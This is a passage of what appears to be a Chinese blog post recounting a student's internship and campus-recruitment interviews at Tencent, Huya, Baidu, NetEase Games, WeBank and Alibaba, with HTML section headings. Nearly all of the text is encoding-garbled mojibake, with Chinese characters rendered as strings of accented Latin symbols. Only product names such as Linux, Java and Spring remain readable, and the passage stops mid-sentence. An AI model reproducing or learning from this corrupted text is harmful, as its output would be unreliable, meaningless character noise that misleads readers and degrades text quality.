Lowï¼Œæˆ‘è‡ªå·±åœ¨ä»‹ç»çš„æ—¶å€™ä¹Ÿè¯´å¾—å¾ˆä¸å ªã€‚èŒä¸šè§„åˆ’æˆ‘è¯´è‡ªå·±å¸Œæœ›åœ¨ä¸€äº›æ–¹é¢æ·±å…¥å­¦ä¹ ï¼Œå› ä¸ºè‡ªå·±ç°åœ¨åœ¨è¿™äº›æ–¹é¢è¿˜å¾ˆè–„å¼±... é¢å®Œä¹‹åæˆ‘å°±çŸ¥é“æŒ‚äº†ï¼Œå› ä¸ºæ•´ä¸ªé¢è¯•è¿‡ç¨‹æˆ‘éƒ½ç‰¹åˆ«è™šï¼Œè¿˜ä¸»åŠ¨è¯´è‡ªå·±æŠ€æœ¯èƒ½åŠ›ä¸è¡Œã€‚ä¸å‡ºæ‰€æ–™ï¼Œé¢å®Œçš„å½“å¤©æ™šä¸Šï¼ŒçŠ¶æ€å˜æˆäº†ä¸åˆé€‚ã€‚</p><p>ä½†æ˜¯è¿‡äº†å‡ å¤©ï¼Œçªç„¶æ”¶åˆ°è…¾è®¯çš„ç”µè¯ï¼Œé—®æˆ‘æ˜¯å¦æ„¿æ„å»æ·±åœ³å‚åŠ é¢è¯•ï¼ˆç¬”è€…å­¦æ ¡åœ¨å¹¿å·ï¼‰ã€‚å½“ç„¶æˆ‘æ¯«ä¸çŠ¹è±«åœ°ç­”åº”äº†ï¼Œå¾ˆå¼€å¿ƒè…¾è®¯è¿˜èƒ½ç»™æˆ‘æœºä¼šã€‚ç»è¿‡äº†ä¸Šä¸€åœºé¢è¯•çš„å¯ç¤ºï¼Œè¿™æ¬¡é¢è¯•æˆ‘è¡¨ç°åœ°éå¸¸è‡ªä¿¡ï¼Œè‡ªå·±çŸ¥é“çš„çŸ¥è¯†éƒ½å¾ˆæœ‰ä¿¡å¿ƒåœ°è¡¨è¾¾å‡ºæ¥ï¼Œè¢«é—®åˆ°ä¸ä¼šçš„å†…å®¹ä¹Ÿä¸ä¼šé‚£ä¹ˆæ…Œå¼ ï¼Œå’Œé¢è¯•å®˜æ¢è®¨ä¸€äº›ç»†èŠ‚ï¼Œç„¶åè¯´è¯´è‡ªå·±çš„æƒ³æ³•ï¼Œè¿˜æœ‰è‡ªå·±çœ‹è¿‡ç›¸å…³çš„å†…å®¹ã€‚ç”±äºè¿™æ˜¯è…¾è®¯äº‘éƒ¨é—¨ï¼Œå¯¹ Linux å†…æ ¸å’Œ C++ æœ‰å¾ˆé«˜çš„è¦æ±‚ï¼Œé—®äº†å‡ ä¸ªç›¸å…³çš„é—®é¢˜æˆ‘éƒ½æ²¡å›ç­”å‡ºæ¥ï¼Œæ¯”å¦‚å¦‚ä½•å®ç°å®ˆæŠ¤è¿›ç¨‹ï¼ŒLinux ä¿¡å·æœºåˆ¶ï¼ŒLinux çº¿ç¨‹çš„ä¸å¯ä¸­æ–­é˜»å¡çŠ¶æ€å¦‚ä½•è¿›å…¥ç­‰ç­‰ã€‚é™¤äº†è¿™äº›é—®é¢˜ï¼Œå…¶å®ƒåœ°å›ç­”çš„éƒ½è¿˜è¡Œã€‚é—æ†¾çš„æ˜¯ï¼Œå½“å¤©æ™šä¸Šé¢è¯•å®˜æ‰“ç”µè¯å‘ŠçŸ¥æˆ‘é¢è¯•æ²¡é€šè¿‡ã€‚ä½†æ˜¯ä»–è¯´æˆ‘å…¶å®ƒæ–¹é¢éƒ½å¾ˆä¸é”™ï¼Œæ‰€ä»¥é—®æˆ‘æ„¿ä¸æ„¿æ„å‚åŠ è…¾è®¯äº‘ Java éƒ¨é—¨çš„æ‹›è˜ï¼Œäºæ˜¯ç¬¬äºŒå¤©æˆ‘åˆå»äº†ä¸€ä¸ªæ–°çš„éƒ¨é—¨é¢è¯•ã€‚</p><p>è¿™æ¬¡é¢è¯•æ˜¯åœ¨éƒ¨é—¨çš„ä¼šè®®å®¤è¿›è¡Œçš„ï¼Œè¿›åˆ°å…¬å¸ä¹‹åè¯´å®è¯æ²¡æœ‰è‡ªå·±æƒ³è±¡ä¸­é‚£ä¹ˆå¥½ï¼Œå·¥ä½å¾ˆæŒ¤ç¯å¢ƒä¸€èˆ¬ã€‚ä¸€å¼€å§‹å°±å…ˆéšä¾¿èŠèŠï¼Œå­¦æ ¡çš„ç ”ç©¶å·¥ä½œï¼Œå­¦ä¹ ä¹‹ç±»çš„ã€‚ç„¶åçœ‹äº†çœ‹é¡¹ç›®ï¼Œçœ‹å®Œä¹‹åæˆ‘å°±çŸ¥é“å‡‰äº†ä¸€åŠï¼Œè¿™ä¸ªé¡¹ç›®ç¡®å®å¤ªæ°´äº†ï¼Œé¢è¯•å®˜çœ‹äº†ä¹‹åæ²¡æœ‰æ¥ç€é—®ï¼Œä¹Ÿèƒ½æ„Ÿå—åˆ°é¢è¯•å®˜æœ‰ç‚¹å«Œå¼ƒã€‚ç„¶åä»–å°±é—®äº†ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œé—®åˆ°è¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼Œé¢è¯•å®˜è®©æˆ‘å®ç°ä¸€ä¸ªä»»åŠ¡è°ƒåº¦ç³»ç»Ÿã€‚å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡æ‰‹å†™ä»£ç ï¼Œè€Œä¸”ä¹‹å‰ç¡®å®æ²¡è€ƒè™‘è¿‡è¿™ä¸ªé—®é¢˜ï¼Œç„¶åå°±èƒ¡ä¹±å†™äº†ä¸€å †ä»£ç ï¼Œç‰¹åˆ«ä¹±ï¼Œè€Œä¸”åˆ°å¤„æ¶‚æ”¹ã€‚æ˜¾ç„¶é¢è¯•å®˜æ˜¯ä¸æ»¡æ„çš„ï¼Œå†™äº†ä¹Ÿæœ‰åå‡ åˆ†é’Ÿä¹‹åï¼Œæˆ‘è‡ªå·±éƒ½çŸ¥é“å·²ç»å‡‰äº†ï¼Œç„¶åé¢è¯•å®˜æ²¡è®©æˆ‘æ¥ç€å†™ï¼Œä¹Ÿæ²¡ç»™æˆ‘ä»»ä½•æç¤ºï¼Œè¯´å°±åˆ°è¿™é‡Œï¼Œé¢è¯•ç»“æŸäº†ï¼Œè¿˜æœ‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜æƒ³é—®çš„ã€‚å½“ç„¶çœ‹è¿‡ä»»åŠ¡è°ƒåº¦ç³»ç»Ÿç›¸å…³çš„æ–‡ç« ä¼šè§‰å¾—æŒºå®¹æ˜“çš„ï¼Œæ¯”å¦‚ä½¿ç”¨æ—¶é—´è½®å®ç°ç­‰ç­‰ã€‚æˆ‘ä¾ç„¶è®°å¾—é¢è¯•å®˜é€æˆ‘å‡ºé—¨æ—¶å€™çš„çƒ­æƒ…ï¼Œé€æˆ‘åç”µæ¢¯çš„æ—¶å€™è¿˜å¾ˆçƒ­æƒ…åœ°å’Œæˆ‘è¯´ï¼Œéå¸¸æ„Ÿè°¢å‚åŠ æœ¬æ¬¡é¢è¯•ï¼Œè¾›è‹¦äº†ã€‚</p><h2>3.4 è™ç‰™è¿‡äºè‡ªä¿¡</h2><p>ç»è¿‡äº†é˜¿é‡Œå’Œè…¾è®¯çš„é¢è¯•ä¹‹åï¼Œæˆ‘è§‰å¾—è‡ªå·±å¤§æ¦‚å·²ç»çŸ¥é“è¯¥æ€ä¹ˆé¢è¯•äº†ï¼Œé¢è¯•æ—¶å€™è¯¥æ³¨æ„ä»€ä¹ˆï¼Œè¯¥æ€ä¹ˆè¡¨è¾¾ç­‰ç­‰ã€‚è€Œä¸”è…¾è®¯é¢è¯•è¡¨ç°ä¹Ÿä¸å·®ï¼Œè™½ç„¶æœ€åæ²¡é€šè¿‡ã€‚æ‰€ä»¥åœ¨è™ç‰™é¢è¯•çš„æ—¶å€™ç‰¹åˆ«æ”¾æ¾ï¼Œè§‰å¾—åº”è¯¥èƒ½é€šè¿‡ã€‚å‰é¢é¢çš„ä¹Ÿéƒ½è¿˜è¡Œï¼Œè™½ç„¶æœ‰å‡ ä¸ªé—®é¢˜æ²¡å›ç­”å¥½ï¼Œæ¯”å¦‚åˆ†æä¸€ä¸‹å¾®åšçš„æ—¶é—´çº¿ã€‚é€šè¿‡äº†ç¬¬ä¸€è½®é¢è¯•ç›´æ¥ç­‰ç¬¬äºŒè½®ï¼Œç­‰åˆ°äº†æ™šä¸Šä¸ƒç‚¹å¤šæ‰ç­‰åˆ°æˆ‘ã€‚è™ç‰™é¢è¯•è¿˜æ˜¯å¾ˆæ³¨é‡æŠ€æœ¯çš„ï¼Œè™½ç„¶é—®çš„éƒ½ä¸æ˜¯å¾ˆæ·±å…¥ï¼Œåªè¦ç®€å•å›ç­”åˆ°ç‚¹ä¸Šå°±ä¸ä¼šæ¥ç€é—®ä¸‹å»ã€‚äºŒé¢ä¹Ÿæœ‰ä¸€äº›é—®é¢˜æ²¡å›ç­”å¥½ï¼Œæ¯”å¦‚ ConcurrentHashMap çš„å¹¶å‘æœºåˆ¶ï¼Œé—® Spring ç›´æ¥è¯´ä¸ä¼šã€‚ä¹Ÿæœ‰ä¸€äº›é—®é¢˜å›ç­”å¾—æ¯”è¾ƒä¹±ï¼Œæ²¡æœ‰æ¡ç†ã€‚ä½†æ˜¯æˆ‘è§‰å¾—å¤§éƒ¨åˆ†é—®é¢˜éƒ½å›ç­”çš„ä¸é”™ï¼Œåº”è¯¥èƒ½é€šè¿‡ã€‚å¯æ˜¯é¢è¯•å®Œä¹‹åï¼Œé¢è¯•å®˜é—®æœ‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜è¦é—®ä»–ï¼Œç”±äºå¤ªè¿‡æ”¾æ¾ï¼Œæˆ‘å°±é—®ä½ ä»¬éƒ½åŠ ç­åˆ°è¿™ä¹ˆæ™šä¸åƒé¥­å—ï¼Œå¥½é¥¿å•Šï¼Œå‘¨å…­å‘¨æ—¥è¿˜åŠ ç­å—... é—®å®Œä¹‹åé¢è¯•å®˜å°±å¾ˆä¸¥è‚ƒäº†ï¼Œè¯´å¹³å¸¸ä¸åŠ ç­çš„ï¼Œæˆ‘çªç„¶æ„è¯†åˆ°äº†é—®é¢˜çš„ä¸¥é‡æ€§... æœ€åè¿˜æ˜¯å‡‰äº†ã€‚</p><h2>3.5 ç™¾åº¦ç¬¬ä¸€ä¸ª Offer</h2><p>è¢«ä¸‰å®¶è¿ç»­æ‹’äº†ä¹‹åï¼Œéƒ½å¼€å§‹æ€€ç–‘è‡ªå·±äº†ï¼Œä¸è¿‡è¿˜æ˜¯æé†’è‡ªå·±è¦ä¿æŒä¿¡å¿ƒã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œç™¾åº¦çš„é¢è¯•éå¸¸é€‚åˆæˆ‘ï¼Œä¸‰è½®éƒ½æ˜¯æŠ€æœ¯é¢ï¼Œè€Œä¸”æ‰‹å†™ç®—æ³•é¢˜ç›®å±…å¤šï¼Œè€Œæˆ‘å‡†å¤‡æœ€å¤šçš„æ˜¯ç®—æ³•ï¼Œæ‰€ä»¥å¾ˆé¡ºåˆ©é€šè¿‡äº†é¢è¯•ã€‚ä½†æ˜¯é¢è¯•è¡¨ç°å¹¶æ²¡æœ‰ç‰¹åˆ«å¥½ï¼Œè¿‡äº†æ¯”è¾ƒé•¿çš„æ—¶é—´æ‰è¢«æï¼Œè€Œä¸”æ˜¯å·¥ç¨‹æ•ˆç‡éƒ¨é—¨ï¼Œåšå†…éƒ¨å·¥å…·çš„ï¼Œå¯¹ä¸ªäººæˆé•¿å¹¶ä¸å¥½ï¼Œæ‰€ä»¥ä¸æ˜¯ç‰¹åˆ«æ»¡æ„ã€‚</p><h2>3.6 ç½‘æ˜“æ¸¸æˆæœ€å¥½çš„é¢è¯•ä½“éªŒ</h2><p>å…¶å®æœ€å¼€å§‹æ²¡æœ‰æ‰“ç®—æŠ•ç½‘æ˜“æ¸¸æˆçš„ï¼Œå› ä¸ºè¢«è„‰è„‰æ´—è„‘ï¼Œå·²ç»æ”¾å¼ƒäº†åšæ¸¸æˆã€‚ä½†æ˜¯å› ä¸ºå‰é¢é¢è¯•åŸºæœ¬è¢«æ‹’äº†ï¼Œæ‹…å¿ƒæ²¡æœ‰å®ä¹  Offerï¼Œå› æ­¤å°±è¯•è¯•çœ‹ã€‚</p><p>å› ä¸ºæ²¡æœ‰ç‰¹åˆ«æƒ³å»ç½‘æ˜“æ¸¸æˆï¼Œæ‰€ä»¥é¢è¯•è¿‡ç¨‹ä¹Ÿæ¯”è¾ƒæ”¾æ¾ï¼Œå°±å½“å»èŠèŠå¤©ã€‚é¢è¯•å®˜éå¸¸ niceï¼Œé‚£å¤©ä¸‹åˆæŒ¤äº†å¾ˆä¹…åœ°é“ï¼Œæ¯”è¾ƒå£æ¸´ï¼Œç„¶åé¢è¯•å®˜çœ‹æˆ‘è¯´å¾—æ²™å“‘äº†ï¼Œåˆ°é—¨å£å¸®æˆ‘ä¹°äº†ä¸€ç“¶å¯ä¹ï¼Œéå¸¸æ„Ÿæ¿€ã€‚é¢è¯•ä¹‹å‰æˆ‘å°±æå‡ºæˆ‘å¯¹ C++ ä¸ç†Ÿæ‚‰ï¼Œæœ€è¿‘ä¸»è¦çœ‹ Java çš„å†…å®¹ã€‚é¢è¯•å®˜è¿˜æ˜¯è¯´æ²¡å…³ç³»ï¼Œå°½é‡å›ç­”å°±å¥½ã€‚å½“ç„¶æœ€åæˆ‘éƒ½æŠŠé—®é¢˜å¾€ Java é‚£é‡Œå›ç­”äº†ï¼Œæ¯”å¦‚ Map çš„å®ç°ï¼Œå†…å­˜ç®¡ç†ç­‰ç­‰ã€‚æœ€åèŠäº†ä¸€äº›ç©è¿‡çš„æ¸¸æˆï¼Œå°±è®©æˆ‘å›å»ç­‰æ¶ˆæ¯ã€‚ç½‘æ˜“æ¸¸æˆå°±ä¸€è½®é¢è¯•ï¼Œç¡®å®å°±ä¸€è½®ã€‚å‘¨äº”å‚åŠ çš„é¢è¯•ï¼Œä¸‹å‘¨ä¸€å°±ç»™ Offer äº†ï¼Œæ•ˆç‡ç‰¹åˆ«é«˜ã€‚</p><h2>3.7 å¾®ä¼—ç„å­¦é¢è¯•</h2><p>é€šè¿‡å¾®ä¼—é¢è¯•æˆ‘è‡ªå·±éƒ½éå¸¸åƒæƒŠï¼Œä¸€é¢çš„æ—¶å€™å°±ç®€å•è‡ªæˆ‘ä»‹ç»äº†ä¸€ä¸‹ï¼Œç„¶åé¢è¯•å®˜å¼€å§‹ä»‹ç»ä»–è‡ªå·±çš„å·¥ä½œç»å†ï¼Œä»¥åŠç°åœ¨éƒ¨é—¨åœ¨åšçš„å†…å®¹ã€‚ä¹‹åé—®äº†æˆ‘ä¸€ä¸ªåœºæ™¯åˆ†æé—®é¢˜ï¼Œæˆ‘æƒ³äº†ä¸€ä¼šå„¿æ²¡æƒ³å‡ºæ¥ï¼Œäºæ˜¯é¢è¯•å®˜æ‹¿èµ·è‰ç¨¿çº¸æŠŠå„ç§éœ€æ±‚è¯¦ç»†è¯´äº†ä¸€éï¼Œç„¶åæŠŠç³»ç»Ÿæ¶æ„å›¾ä¹Ÿç”»äº†å‡ºæ¥... æœ€åä»–é—®è¿˜æœ‰ä»€ä¹ˆæˆ‘ä¼˜åŠ¿çš„åœ°æ–¹ä»–æ²¡é—®åˆ°çš„ï¼Œæˆ‘é—®ä»–æ€ä¹ˆä¸é—®é—®ç®—æ³•é¢˜ï¼Œä»–è¯´ç¬”è¯•éƒ½é€šè¿‡äº†æ²¡å¿…è¦å†é—®ã€‚é¢å®Œä¹‹åæˆ‘è§‰å¾—èŠå¾—å¾ˆå¼€å¿ƒï¼Œä½†æ˜¯æŠ€æœ¯é—®é¢˜æ²¡å›ç­”å¥½ï¼Œå‡ºä¹æ„æ–™æ”¶åˆ°äº†äºŒé¢é€šçŸ¥ã€‚äºŒé¢æ²¡é—®æŠ€æœ¯ï¼Œå°±è®©ä»‹ç»äº†é¡¹ç›®ï¼Œå†é—®é—®å®¶ä½å“ªä¹‹ç±»çš„é—®é¢˜ï¼Œä¹Ÿé¡ºåˆ©é€šè¿‡äº†ã€‚HR é¢å°±ä¸ç”¨ä»‹ç»ã€‚æ”¶åˆ°äº†å¾®ä¼—çš„ Offerï¼Œå¾—çŸ¥äº†éƒ¨é—¨æ˜¯è´·æ¬¾ç§‘æŠ€éƒ¨ï¼Œéå¸¸æ ¸å¿ƒï¼Œå¾ˆåƒé¦™ï¼Œè¿‘å‡ å¹´ä¹Ÿåœ¨æ‰©å±•ä¸€äº›ä¸šåŠ¡ï¼Œè¿˜æ˜¯æœ‰ç‚¹å°å¿ƒåŠ¨çš„ã€‚è™½ç„¶æœ€åæ²¡é€‰æ‹©å»å¾®ä¼—å®ä¹ ï¼Œä½†æ˜¯ä¸€é¢é¢è¯•å®˜åŠ äº†æˆ‘å¾®ä¿¡ï¼Œæˆ‘å¾ˆæ„Ÿè°¢ä»–ä¸€é¢éå¸¸è€å¿ƒç»™æˆ‘è®²è§£ï¼Œå¹¶è®©æˆ‘é€šè¿‡ã€‚ä»–è¯´æˆ‘æ˜¯ä»–é¢è¯•çš„ç¬¬ä¸€é¡ºä½ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªé¢è¯•è€…ï¼Œæ‰€ä»¥ä¼šæ”¾å®½å¾ˆå¤šï¼Œä¹Ÿå¸Œæœ›æˆ‘ç§‹æ‹›èƒ½åŠ å…¥ä»–ä»¬ã€‚</p><h2>3.8 å®ä¹ é€‰æ‹©</h2><p>å…¶å®æœ€ç†æƒ³çš„æ˜¯å»ç™¾åº¦å®ä¹ ï¼Œç§‹æ‹›ä¹Ÿä¼šå®¹æ˜“å¾ˆå¤šã€‚ä½†æ˜¯è€ƒè™‘åˆ°ç™¾åº¦æ˜¯åœ¨åŒ—äº¬ï¼Œéƒ¨é—¨å¾ˆè¾¹ç¼˜ï¼Œè€Œä¸”éœ€è¦å®ä¹ å¾ˆé•¿æ—¶é—´ä¹Ÿä¸ä¸€å®šèƒ½è½¬æ­£ï¼Œæ‰€ä»¥è¿˜æ˜¯æ”¾å¼ƒäº†ã€‚æœ€ååªèƒ½åœ¨ç½‘æ˜“æ¸¸æˆå’Œå¾®ä¼—é€‰ï¼Œè™½ç„¶è‡ªå·±ä¸æƒ³åšæ¸¸æˆï¼Œä½†æ˜¯è€ƒè™‘åˆ°ç½‘æ˜“æ¸¸æˆçš„å¹³å°è®¤å¯ç¨‹åº¦æ¯”å¾®ä¼—å¥½ï¼Œç§‹æ‹›è‚¯å®šä¼šæ›´å®¹æ˜“ä¸€äº›ã€‚è€Œä¸”ç§‹æ‹›å¦‚æœè¿˜æƒ³è¿›å¾®ä¼—çš„è¯ä¹Ÿä¼šæ¯”è¾ƒå®¹æ˜“ï¼Œå› ä¸ºé¢è¯•å®˜å’Œ HR éƒ½è¯´ç§‹æ‹›çš„æ—¶å€™ä¼šä¼˜å…ˆè€ƒè™‘æˆ‘ï¼Œæ‰€ä»¥æœ€åè¿˜æ˜¯å»äº†ç½‘æ˜“æ¸¸æˆå®ä¹ ã€‚</p><h2>3.9 å®ä¹ ä¹‹å‰çš„å¿«é€Ÿå­¦ä¹ æœŸ</h2><p>ç»å†äº†æ˜¥æ‹›ä¹‹åï¼Œè®¤è¯†åˆ°äº†è‡ªå·±èº«ä¸Šçš„ä¸è¶³ï¼Œæ¯”å¦‚äº¤æµè¡¨è¾¾èƒ½åŠ›çš„æ¬ ç¼ºï¼ŒçŸ¥è¯†ç§¯ç´¯å¾—ä¸å¤Ÿï¼Œé¡¹ç›®æ·±åº¦ä¸å¤Ÿã€‚å› æ­¤åœ¨å®ä¹ ä¹‹å‰çš„ä¸¤ä¸‰ä¸ªæœˆï¼Œå¼€å§‹é’ˆå¯¹è¿™äº›é—®é¢˜é€ä¸ªè§£å†³ã€‚</p><ul><li>äº¤æµè¡¨è¾¾èƒ½åŠ›æ¬ ç¼ºï¼Œå°±æå‰å‡†å¤‡å¥½å„ç§éæŠ€æœ¯é—®é¢˜ï¼Œç„¶åå¯¹ç€é•œå­å›ç­”ï¼ŒæŠŠè‡ªå·±å½“æˆå¬ä¼—ï¼Œå¹¶ä¸”ä¹Ÿç”¨å½•éŸ³æœºå½•ä¸‹æ¥ã€‚ </li><li>çŸ¥è¯†ç§¯ç´¯ä¸å¤Ÿï¼Œé‡‡å–çš„ç­–ç•¥æ˜¯ä¿è¯å¹¿åº¦ä¼˜å…ˆï¼Œå¹¶ä¸”åœ¨é‡è¦çš„å†…å®¹ä¸Šä¿è¯æ·±åº¦ã€‚å…¶å®ä¹‹å‰åŸºç¡€çŸ¥è¯†å·²ç»æŒæ¡çš„æ¯”è¾ƒå¥½äº†ï¼Œå†å­¦å…¶å®ƒæŠ€æœ¯çš„æ—¶å€™éƒ½æœ‰å¾ˆå¤šç›¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥å­¦èµ·æ¥å¾ˆå¿«ã€‚ </li><li>é¡¹ç›®æ·±åº¦ä¸å¤Ÿï¼Œå°±æŠŠé‚£ä¸ªå¾®åšç³»ç»Ÿåšäº†ä¸€ç‚¹æ”¹è¿›ï¼Œå­¦äº† Spring ä¹‹åæ”¹ç”¨ Java å®ç°ã€‚ </li></ul><h2>3.10 ä¸é‚£ä¹ˆå®‰å¿ƒçš„å®ä¹ </h2><p>å»å®ä¹ çš„æ—¶å€™è¿˜æ˜¯æŒºæƒŠå–œçš„ï¼Œå› ä¸ºæˆ‘è¢«å®‰æ’çš„å·¥ä½œæ˜¯æ¸¸æˆå¼•æ“ç›¸å…³çš„ï¼Œå’Œè‡ªå·±çš„ç ”ç©¶ç”Ÿæ–¹å‘ç´§å¯†ç›¸å…³ï¼Œæˆ‘è§‰å¾—åšå®Œå®ä¹ é¡¹ç›®ä¹‹åè‡ªå·±çš„æ¯•ä¸šè®ºæ–‡ä¹Ÿä¼šæ¯”è¾ƒæœ‰çµæ„Ÿã€‚</p><p>ä½†ä¸å¹¸çš„æ˜¯ï¼Œåœ¨å»çš„ç¬¬ä¸€å¤©éƒ¨é—¨æ¥å¾…èšé¤ä¸Šï¼ŒæœåŠ¡ç«¯ä¸»ç¨‹å°±è¯´ï¼Œæˆ‘ä»¬éƒ¨é—¨å·¥ä½œåˆ¶æ˜¯ä¹ä¹å…­ï¼Œç°åœ¨äº’è”ç½‘éƒ½æ˜¯ä¹ä¹å…­ã€‚åœ¨å®ä¹ ä¹‹å‰æˆ‘äº†è§£çš„æ˜¯å®ä¹ ç”Ÿå…­ç‚¹å°±å¯ä»¥èµ°ï¼Œè€Œä¸”åªç”¨ä¸Šäº”å¤©ç­ï¼Œå¬åˆ°ä»–è¿™ä¹ˆä¸€è¯´å¿ƒéƒ½å‡‰é€äº†ï¼Œå› ä¸ºå·²ç»æƒ³å¥½äº†æ™šä¸Šå’Œå‘¨æœ«æ—¶é—´ç”¨æ¥å¤ä¹ ã€‚å¦‚æœçŸ¥é“æ˜¯ä¹ä¹å…­ï¼Œæˆ‘ä¼šé€‰æ‹©å»ç™¾åº¦ã€‚</p><p>å…¶å®ç½‘æ˜“æ¸¸æˆéƒ¨é—¨æ°›å›´è¿˜æ˜¯ä¸é”™çš„ï¼Œå¯¹å‘˜å·¥å¾ˆå¥½ï¼Œè€Œä¸”æˆ‘çš„å®ä¹ å¯¼å¸ˆäººä¹Ÿå¾ˆå¥½ï¼Œåœ¨æˆ‘ç”Ÿç—…çš„é‚£å‡ å¤©å¾ˆå…³å¿ƒæˆ‘ã€‚ä½†æ˜¯ä¹ä¹å…­çš„å·¥ä½œåˆ¶å¯¹ç§‹æ‹›å¤ä¹ è¿˜æ˜¯æœ‰å¾ˆå¤§å½±å“çš„ï¼Œè€Œä¸”æ¯å¤©ä¸Šä¸‹ç­èŠ±åœ¨è·¯ä¸Šçš„æ—¶é—´è¶…è¿‡äº†ä¸¤ä¸ªå°æ—¶ï¼Œä¸‹ç­å›å¯å®¤ä¹‹åæ€»æƒ³ç€çœ‹ä¼šå„¿è§†é¢‘ä¼‘æ¯ä¸€ä¸‹ï¼Œç„¶ååˆè¦æ—©æ—©ç¡è§‰èµ¶ç€ç¬¬äºŒå¤©ä¸Šç­ã€‚æ²¡åŠæ³•åªèƒ½åœ¨ä¸Šä¸‹ç­åœ°é“ä¸Šå¤ä¹ ï¼Œè¿˜æœ‰å°±æ˜¯åˆä¼‘æ—¶é—´æ¥ç€å¤ä¹ ã€‚</p><p>ğŸš€</p><h2>4. ç§‹æ‹›</h2><h2>4.1 ç§‹æ‹›å¼€å§‹</h2><p>å®ä¹ ä¹‹åå·²ç»æ˜¯ä¹æœˆä»½äº†ï¼Œé‚£æ—¶å€™å·²ç»é”™è¿‡äº†æ‰€æœ‰æå‰æ‰¹ã€‚è€Œä¸”å®ä¹ çš„æ—¶å€™æ²¡æ€ä¹ˆå¤ä¹ ï¼Œä¹æœˆåˆè¿˜æ˜¯æ„Ÿè§‰æ²¡æ€ä¹ˆå‡†å¤‡å……åˆ†ï¼Œæ‰€ä»¥å°±åˆç­‰äº†åŠä¸ªæœˆæ‰å¼€å§‹æŠ•ç®€å†ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™å’Œæ˜¥æ‹›ç›¸æ¯”ï¼Œå·²ç»æŠŠå¤§éƒ¨åˆ†åå°ç ”å‘ç›¸å…³çš„çŸ¥è¯†ç‚¹è¿‡äº†ä¸€éï¼Œå¾ˆå¤šé‡è¦çš„å†…å®¹å‰å‰ååä¹Ÿçœ‹äº†åå‡ éï¼Œæ²¡æœ‰æ˜¥æ‹›æ—¶å€™é‚£ä¹ˆè¿·èŒ«å’Œç„¦è™‘ã€‚å³ä½¿è¢«é—®åˆ°æ²¡æœ‰æŒæ¡çš„çŸ¥è¯†ï¼Œæˆ‘ä¹Ÿæœ‰æŠŠæ¡é€šè¿‡è®¨è®ºçš„æ–¹å¼ï¼Œç»™å‡ºå¤§æ¦‚çš„æ€è·¯ï¼Œå› ä¸ºå¾ˆå¤šæŠ€æœ¯ç¡®å®æ˜¯ç›¸é€šçš„ã€‚</p><h2>4.2 é˜¿é‡Œçœ‹ä¸æ‡‚çš„å†…éƒ¨æµç¨‹</h2><p>ç§‹æ‹›ç¬¬ä¸€ä¸ªæŠ•é€’çš„ä¾ç„¶æ˜¯é˜¿é‡Œï¼Œæœ€å¼€å§‹ç³»ç»Ÿè‡ªåŠ¨å‘èµ·äº†ä¸€ä¸ªæ–°çš„æµç¨‹ï¼Œç„¶åè¿‡äº†å‡ å¤©è‡ªåŠ¨å›ç»äº†... å…«æœˆæœ«çš„æ—¶å€™ä¹Ÿæ‰¾äººå†…æ¨äº†ï¼Œä½†æ˜¯åˆè¢«é˜¿é‡Œç›´æ¥å›ç»äº†... é‚£æ—¶å€™å·²ç»è§‰å¾—å¯èƒ½æ˜¯æ˜¥æ‹›é¢è¯•è¡¨ç°å¤ªå·®ï¼Œæ­¤ç”Ÿæ— ç¼˜é˜¿é‡Œäº†ã€‚å¯æ˜¯è¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œæ­£å¼æ ¡æ‹›çš„æ—¶å€™ï¼Œé˜¿é‡Œåˆå‘èµ·äº†ä¸€ä¸ªæ–°çš„æµç¨‹æˆå¼„æˆ‘ï¼Œæ”¶åˆ°ç¬”è¯•é€šçŸ¥çš„æ—¶å€™ï¼Œæˆ‘è¿˜çŠ¹è±«äº†åˆ°åº•å‚ä¸å‚åŠ ï¼Œå› ä¸ºé‚£æ—¶å€™å·²ç»ä¹æœˆä¸­æ—¬ï¼Œå¬è¯´é˜¿é‡Œå·²ç»æ²¡æœ‰ HC äº†ã€‚è€Œä¸”æŒ‰å‰é¢å›ç»æˆ‘çš„æ€åº¦ï¼Œæ„Ÿè§‰å³ä½¿ç¬”è¯•é€šè¿‡é¢è¯•ä¹Ÿé€šè¿‡ä¸äº†ã€‚ç¬”è¯•é‚£å¤©æ™šä¸Šï¼Œæœ¬æ¥å‡†å¤‡çœ‹ä¸ªç”µå½±æ”¾æ¾ä¸€ä¸‹ï¼Œåæ¥æƒ³äº†æƒ³è¿˜æ˜¯å‚åŠ äº†ç¬”è¯•ï¼Œç¬”è¯•å„ç§æœºå™¨å­¦ä¹ å’Œæ•°å­¦é¢˜ï¼Œæ„Ÿè§‰æ‹¿é”™äº†è¯•å·ï¼Œç¬”è¯•å®Œæˆ‘å·²ç»æŠŠé˜¿é‡Œä»æˆ‘çš„å…¬å¸è¿›åº¦åˆ—è¡¨ä¸­åˆ é™¤äº†ï¼Œä¸å†çº ç»“é˜¿é‡Œã€‚å¯æ˜¯è¿‡äº†ä¸€æ®µæ—¶é—´æ”¶åˆ°é˜¿é‡Œçš„é¢è¯•é€šçŸ¥ï¼Œæˆ‘ä»¥ä¸ºæ˜¯èµ°èµ°å½¢å¼ï¼Œå¯èƒ½å‚åŠ ç¬”è¯•çš„äººå¾ˆå°‘äº†ï¼Œæ‰€ä»¥æ‰é€‰ä¸­æˆ‘å‚åŠ é¢è¯•ã€‚é‚£æ—¶å€™é˜¿é‡Œæ‹›è˜å®˜ç½‘çŠ¶æ€ä¸€æ’çš„å·²å›ç»ï¼Œè®©æˆ‘å¯¹é˜¿é‡Œæœ‰ä¸€ç§ææƒ§æ„Ÿï¼Œè§‰å¾—é¢è¯•è‚¯å®šæŒ‚ã€‚ä½†æ˜¯çœŸæ­£é¢è¯•çš„æ—¶å€™å´æ„å¤–çš„é¡ºåˆ©ï¼Œæ”¶åˆ°äºŒé¢é€šçŸ¥çš„æ—¶å€™ç‰¹åˆ«æ¿€åŠ¨ï¼Œç„¶åé¢å®ŒäºŒé¢åˆè®©ç›´æ¥ç­‰ HR é¢ï¼ŒHR 